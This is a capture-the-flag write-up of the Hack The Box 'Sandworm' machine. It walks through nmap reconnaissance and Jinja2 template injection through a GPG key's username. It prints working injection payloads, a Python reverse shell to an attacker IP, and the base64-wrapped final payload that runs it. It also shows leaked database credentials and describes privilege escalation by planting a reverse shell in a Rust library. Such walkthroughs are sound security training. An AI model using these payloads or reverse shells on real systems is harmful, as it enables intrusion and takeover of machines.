# Sandworm
Hello we are back, and today we’ve solved the First machine of the new Season of Hack the box which is rated Medium, the first one of this difficulty

<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/a50b4680-9e36-40d3-ae88-80a6302076b9"></img>
</div>

So we started out as always by running an nmap scan and a gobuster one
```bash
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/SandWorm]
└─$ cat scans/nmap.txt    
# Nmap 7.93 scan initiated Wed Jun 21 13:08:20 2023 as: nmap -sS -sC -sV -oN scans/nmap.txt 10.129.32.96
Nmap scan report for 10.129.32.96
Host is up (0.057s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 21 13:08:43 2023 -- 1 IP address (1 host up) scanned in 23.25 seconds
```

Here is the site
<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/cc0efa18-1122-4594-8357-957dcb81d15e"></img>
</div>
By running gobuster we can’t find anything because it doesn’t work

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/4393b6e9-57e3-40ad-b0a2-8d215b0d125b"></img>
</div>

So we got to investigate about the pages that we can find by navigating through the site. We can see that we're dealing with a site that manages the `gpg` encryption, so something which was very far from us, so because of this we learnt a lot.

After moving through the pages we can spot something that maybe we can exploit to get a foothold or the last form in the `/guide` page.

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/2ce2ff6d-e3d7-4a3d-b640-857e4194726b"></img>
</div>

Here we can verify the signature of a message by passing to it the key and the signed message. There is even a tutorial from the site itself below, which invite us to download the public key and sign a message

## GPG Encryption
Here is a short description of this encryption

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/0a2394fd-5799-4bbb-a76d-471687e36970"></img>
</div>

So as an asymetrical encryption in order to decrypt messages we need the private key but to encrypt them we just need the public one

- Private key
    - Signature
    - Decryption
- Public Key
    - Encryption
    - Signature Verification

To make our life easier the site provided us an example by giving the public key and a signed message so we can try out the things

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/beb3c447-6b35-4fbc-b74b-bab0bede18b8"></img>
</div>

As expected we receved the desired message of success, so now we got to test this behaviour to find some vulns

## FootHold Vulnerability
By testing the box we’ve found that there is a hidden SSTI on the username of the key, while the site has to verificate the sign, this happens because of the created public key that we sent along with it. Here is a sample.

We used as username some different payloads until we found the right one or `{{3*3}}`

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/73cb11c3-45ab-450f-a66f-5ccff0204dfe"></img>
</div>

And here is while checking

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/88de60e0-ad5b-4ae0-89f2-a62d2b72d84b"></img>
</div>

Knowing this we’ve surfed trhough the net to find some vulns, and we’ve found from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) an intereting image that explains all the possible versions

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/7dea887a-30d7-4761-a12f-0dca629c306e"></img>
</div>

By looking the above image we’ve searched for the `Jinjia2` version always from hacktricks, were we found some interesting [payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#accessing-global-objects) that we can insert to retrieve informations

```python
[]
''
()
dict
config
request
```

With the injection of `{{config}}` we’ve found

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/de4c0344-f82a-4401-bb68-60e851e6ba00"></img>
</div>

As you can see here there are some mysql credentials that we tried to use, without any result :/

```bash
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.10.11.218 -u atlas -pGarlicAndOnionZ42 -D SSA -P3306
ERROR 2002 (HY000): Can't connect to server on '10.10.11.218' (115)
```
So we looked for other payloads like these

```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object". 
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```

All of them worked but while we try to get something more like command execution nothing happens, so by looking further into another site we’ve found a specific payload for Applications made in [Flask](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#playtime)

Here is the query

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

And here is the result on the verification

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/a8cbeae5-9018-4fd4-a234-b279c18daff4"></img>
</div>

We got RCE, so now we gotta get a reverse shell

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/80c4c92a-1e4a-4f1a-afac-85b399101e18"></img>
</div>

Here is the way to change the username to test a new injection

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/6051d636-3e62-4d32-9ea9-8d8ff3dd2891"></img>
</div>

After trying with different payloads we’ve found a way to get a `revshell` with the below `python` payload that we will send while decoding from  `base64`.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.35",33456));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

So we’ve `base64` encoded it

```python
┌──(kali㉿kali)-[~/HackTheBox/Machines/SandWorm]
└─$ cat pyshell.py | base64        
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChz
b2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE1LjM1
IiwzMzQ1NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29z
LmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIiknCg==
```

And now we can modify our username

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/825d28f9-06e9-4b8e-8327-128ae3863c78"></img>
</div>

Here is the final query

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChz\nb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE1LjM1\nIiwzMzQ1NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29z\nLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIiknCg==" | base64 -d | sh').read()}}
```

Now if we listen to the specified port we get the shell

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/f3bb917b-d63a-4b2a-ae24-4b296589d14a"></img>
</div>

So after this we need to take the `user` flag, but we are not allowed 'cause we are `atlas` and not `silentobserver`, but if we look closely to the `atlas`'s folder we can get some ssh credentials located in the .`config` folder for him.`

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/2b286900-81cc-4660-8c8d-a9a35bd58690"></img>
</div>

Finally we can login and get the flag

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/62424a7b-ccf1-4adf-84e0-e9f60dd713fa"></img>
</div>

From silentobserver we can't just fetch the user flag but even try to login into the mysql’s DB with the prevs used credentials

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/c1e34442-3282-4ce5-811c-6d7a5a511881"></img>
</div>

And inside there are some creds

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8b357e52-0967-4c76-8da2-9161c75e7bad"></img>
</div>

It turned out that they are just a rabbit hole ‘cause used to login into an account on a secret website page, that we didn’t find before, but don’t worry we couldn’t do anything there, so let’s look further for the priv-esc

## Root.txt
Here is the info by running `export`

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/947254bb-edd9-46b4-9a8c-e34508d93509"></img>
</div>

As you can see we are in a container called `firejail` which is a python jail used to block users’ operations, so here seems that we are not allowed to do anything

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/3c7b6ebd-8dd1-4474-a612-8e9a6057aed9"></img>
</div>

So we have to turn back as `silentobserver` and run linpeas, where we can find an interesting file that we can run with the SUID bit.

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/00a50177-4138-4a87-8aa1-f68af98efd66"></img>
</div>

As you can see we have `firejail` that we can run while being `jailer` as root, and then we have [tipnet.rs](http://tipnet.rs) which is runnable while being `atlas`. 

```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");

    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();

    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

As you can see aboce there are some mysql creds inside the rust code

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/c59faf5b-223a-4439-9fe5-040a582d6138"></img>
</div>

Unlkuckily another rabbitHole :/
But just at the start we can see that it exports a library or `logger` that we are able to modify to get command execution exactly as we do with libraries in `C` and `python3`.

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/3fee89db-51b5-4d79-ac59-a467e33ff2eb"></img>
</div>

Here you can see that the rust file is ran every time by atlas, so we can modify it and wait while listening

So we took a Rust reverse shell online and pasted it inside the [lib.rs](http://lib.rs) file located at `/opt/crates/logger/src` 

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/5470b67a-22ed-4447-b121-265d7507e340"></img>
</div>

And as you can see we got the shell as `atlas` but now out of the jail, we are allowed to run the `firejail` command as root to get the shell, by using the exploit found before.
Do Not forget to upgrade the shell before running the exploit otherwise we wouldn't be able to get the PID of the spawned process

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/aaf52b6a-e4c5-4d17-a4a8-8eaea522c62f"></img>
</div>

We tried `sudo su -` as the exploit says but it didn’t work so we tried `su root` and got the root shell with the flag

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/7e5cd7cf-43b4-4154-a912-ed24a97be87b"></img>
</div>

Finally! We solved it! 

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b48939c6-39b1-417a-adcc-e6c3556cd9eb"></img>
</div>
This was a pretty interesting `medium` machine of the last season 0xCY@
